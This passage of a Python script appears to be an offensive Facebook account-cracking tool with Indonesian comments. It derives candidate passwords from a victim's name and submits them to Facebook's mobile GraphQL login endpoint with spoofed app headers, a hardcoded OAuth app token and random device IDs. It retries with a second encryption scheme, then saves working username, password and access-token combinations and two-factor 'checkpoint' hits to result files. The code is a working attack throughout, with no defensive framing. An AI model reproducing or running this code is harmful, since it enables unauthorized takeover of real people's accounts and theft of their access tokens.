        fullname = name.lower().strip()
        parts = [p for p in fullname.split() if p]
        passwords = []

        def add_suffix(base):
            candidates = [base]
            for s in suffix_list:
                candidates.append(base + s)
            for candidate in candidates:
                if len(candidate) >= 6 and candidate not in passwords:
                    passwords.append(candidate)

        if len(parts) == 1:
            base = parts[0]
            add_suffix(base)
        elif len(parts) == 2:
            for part in parts:
                if len(part) >= 6:
                    passwords.append(part)
                add_suffix(part)
            combined = parts[0] + parts[1]
            if len(combined) >= 6:
                passwords.append(combined)
            add_suffix(combined)
        else:
            parts = parts[:3]
            for part in parts:
                if len(part) >= 6:
                    passwords.append(part)
                add_suffix(part)
            combinations_2 = [
                parts[0] + parts[1],
                parts[0] + parts[2],
                parts[1] + parts[2]
            ]
            for combo in combinations_2:
                if len(combo) >= 6:
                    passwords.append(combo)
                add_suffix(combo)
            combined_all = parts[0] + parts[1] + parts[2]
            if len(combined_all) >= 6:
                passwords.append(combined_all)
            add_suffix(combined_all)

        return passwords

    # ==================== METODE SMARTLOCK LOGIN (CRACKING) ====================
    def smartlock_login(self, user, passwords):
        global log
        rprint(f'[bold bright_black]   ──> [bold white]Crack {user[:8]}/{len(temp_dump)}/[bold green]{log["success"]}[/bold green]/[bold yellow]{log["checkpoint"]}[/bold yellow]/{log["loop"]}[/]', end='\r')
        for pwd in passwords:
            try:
                encrypted_pass = self.enc.PWD_FB4A(pwd)
                ua_str, loc = self.generate_facebook_user_agent()
                session = requests.Session()

                headers = {
                    'User-Agent': ua_str,
                    'Accept-Encoding': 'gzip, deflate',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'x-tigon-is-retry': 'False',
                    'x-fb-connection-type': 'WIFI',
                    'x-graphql-client-library': 'graphservice',
                    'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
                    'content-encoding': 'gzip',
                    'x-fb-net-hni': '31016',
                    'x-fb-sim-hni': '31016',
                    'authorization': 'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
                    'x-fb-request-analytics-tags': '{"network_tags":{"product":"256002347743983","purpose":"none","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                }

                device_id = str(uuid.uuid4())
                family_id = str(uuid.uuid4())
                secure_family_id = str(uuid.uuid4())
                waterfall_id = str(uuid.uuid4())
                trace_id = str(uuid.uuid4())

                client_input_params = {
                    "block_store_machine_id": "",
                    "contact_point": user,
                    "aymh_accounts": [],
                    "fb_ig_device_id": [],
                    "has_granted_read_contacts_permissions": 0,
                    "cloud_trust_token": None,
                    "password_contains_non_ascii": "false",
                    "zero_balance_state": "",
                    "has_granted_read_phone_permissions": 0,
                    "accounts_list": [],
                    "has_whatsapp_installed": 0,
                    "sim_phones": [""],
                    "headers_infra_flow_id": "",
                    "event_step": "home_page",
                    "client_known_key_hash": "",
                    "app_manager_id": "",
                    "password": encrypted_pass,
                    "event_flow": "login_manual",
                    "openid_tokens": {},
                    "family_device_id": family_id,
                    "machine_id": "",
                    "should_show_nested_nta_from_aymh": 0,
                    "try_num": 1,
                    "login_attempt_count": 1,
                    "device_id": device_id,
                    "auth_secure_device_id": "",
                    "encrypted_msisdn": "",
                    "sso_token_map_json_string": "",
                    "device_emails": [],
                    "lois_settings": {"lois_token": ""},
                    "secure_family_device_id": secure_family_id,
                }

                server_params = {
                    "is_platform_login": 0,
                    "login_credential_type": "none",
                    "should_trigger_override_login_2fa_action": 0,
                    "is_from_logged_in_switcher": 0,
                    "two_step_login_type": "one_step_login",
                    "waterfall_id": waterfall_id,
                    "is_from_msplit_fallback": 0,
                    "pw_encryption_try_count": 1,
                    "server_login_source": "login",
                    "ar_event_source": "login_home_page",
                    "is_from_password_entry_page": 0,
                    "INTERNAL__latency_qpl_marker_id": 36707139,
                    "is_caa_perf_enabled": 1,
                    "is_from_empty_password": 0,
                    "is_from_landing_page": 0,
                    "is_from_logged_out": 0,
                    "is_from_assistive_id": 0,
                    "family_device_id": family_id,
                    "reg_flow_source": "login_home_native_integration_point",
                    "is_from_aymh": 0,
                    "credential_type": "password",
                    "is_vanilla_password_page_empty_password": 0,
                    "username_text_input_id": "3ji67x:86",
                    "password_text_input_id": "3ji67x:87",
                    "layered_homepage_experiment_group": None,
                    "access_flow_version": "pre_mt_behavior",
                    "offline_experiment_group": "caa_iteration_v3_perf_msg_6",
                    "INTERNAL__latency_qpl_instance_id": 2.1415910100247e13,
                    "device_id": device_id,
                    "login_source": "Login",
                    "caller": "gslr",
                    "should_trigger_override_login_success_action": 0
                }

                params_dict = {
                    "client_input_params": client_input_params,
                    "server_params": server_params
                }
                params_json = json.dumps(params_dict, separators=(',', ':'), ensure_ascii=False)
                params_string = f"{{params:{params_json}}}"

                variables = {
                    "params": {
                        "params": params_string,
                        "bloks_versioning_id": "3597b7ec4c1d84726afee9afeac5d20505a1c6f0ff7be1e408afb1b3c36bb936",
                        "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
                    },
                    "scale": "2",
                    "nt_context": {
                        "using_white_navbar": True,
                        "styles_id": "56095d13d2465224983c0303bebdc142",
                        "is_flipper_enabled": False,
                        "pixel_ratio": 2,
                        "is_push_on": True,
                        "bloks_version": "3597b7ec4c1d84726afee9afeac5d20505a1c6f0ff7be1e408afb1b3c36bb936"
                    }
                }

                payload = {
                    "method": "post",
                    "pretty": "false",
                    "format": "json",
                    "server_timestamps": "true",
                    "locale": loc,
                    "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
                    "fb_api_caller_class": "graphservice",
                    "client_doc_id": "119940804212680571989635254761",
                    "variables": json.dumps(variables, separators=(',', ':')),
                    "fb_api_analytics_tags": json.dumps(["GraphServices"], separators=(',', ':')),
                    "client_trace_id": trace_id,
                }

                data_str = urlencode(payload)
                compressed_data = gzip.compress(data_str.encode('utf-8'))
                headers["x-fb-ta-logging-ids"] = f"graphql:{trace_id}"
                headers["Content-Length"] = str(len(compressed_data))

                response = session.post(
                    "https://b-graph.facebook.com/graphql",
                    data=compressed_data,
                    headers=headers,
                    timeout=30
                )
                resp_json = response.json()

                bloks_str = None
                try:
                    action = resp_json.get('data', {}).get('fb_bloks_action', {}).get('root_action', {}).get('action', {})
                    bundle = action.get('action_bundle', {})
                    bloks_str = bundle.get('bloks_bundle_action', '')
                    if bloks_str:
                        bloks_str = bloks_str.replace('\\', '')
                except:
                    pass

                if not bloks_str or 'encryption_retry' in bloks_str:
                    rprint('[bold yellow]encryption_retry detected, fallback to #PWD_MSGR...[/]', end='\r')
                    encrypted_pass = Encrypt_PWD._PWD_MSGR(pwd)
                    client_input_params["password"] = encrypted_pass
                    params_dict["client_input_params"] = client_input_params
                    params_json = json.dumps(params_dict, separators=(',', ':'), ensure_ascii=False)
                    params_string = f"{{params:{params_json}}}"
                    variables["params"]["params"] = params_string
                    payload["variables"] = json.dumps(variables, separators=(',', ':'))
                    data_str = urlencode(payload)
                    compressed_data = gzip.compress(data_str.encode('utf-8'))
                    headers["Content-Length"] = str(len(compressed_data))
                    trace_id = str(uuid.uuid4())
                    headers["x-fb-ta-logging-ids"] = f"graphql:{trace_id}"
                    payload["client_trace_id"] = trace_id
                    response = session.post(
                        "https://b-graph.facebook.com/graphql",
                        data=compressed_data,
                        headers=headers,
                        timeout=30
                    )
                    resp_json = response.json()
                    try:
                        action = resp_json.get('data', {}).get('fb_bloks_action', {}).get('root_action', {}).get('action', {})
                        bundle = action.get('action_bundle', {})
                        bloks_str = bundle.get('bloks_bundle_action', '')
                        if bloks_str:
                            bloks_str = bloks_str.replace('\\', '')
                    except:
                        pass

                if bloks_str:
                    print(bloks_str)
                    if 'session_key' in bloks_str or 'EAAAAU' in bloks_str:
                        log['success'] += 1
                        token_match = re.search(r'"access_token":"([^"]+)"', bloks_str)
                        token = token_match.group(1) if token_match else "UNKNOWN"
                        rprint(Panel(Panel(f"[bold green][+] Username : {user}\n[+] Password : {pwd}\n[+] Access Token : {token}\n[+] User Agent : {ua_str}[/bold green]", style='bold green'), width=80, style='bold bright_black', title='[bold green]Login-Success[/bold green]'))
                        open(file_result["success"], 'a', encoding='utf-8').write(f"{user}|{pwd}|{token}\n")
                        break
                    elif 'redirect_login_challenges' in bloks_str or 'com.bloks.www.ap.two_step_verification.entrypoint_async' in bloks_str:
                        log['checkpoint'] += 1
                        rprint(Panel(Panel(f"[bold yellow][+] Username : {user}\n[+] Password : {pwd}\n[+] User Agent : {ua_str}[/bold yellow]", style='bold yellow'), width=80, style='bold bright_black', title='[bold yellow]Login-Checkpoint[/bold yellow]'))
                        open(file_result['checkpoint'], 'a', encoding='utf-8').write(f"{user}|{pwd}\n")
                        break
                    else:
                        continue

            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
                KenXin_Warning('Koneksi Internet Error!')
                time.sleep(5)
                continue
            except Exception as e:
                continue
        log['loop'] += 1

# ==================== MAIN ====================
if __name__ == "__main__":
    create_folders()
    LoginFacebook().login_cookie()
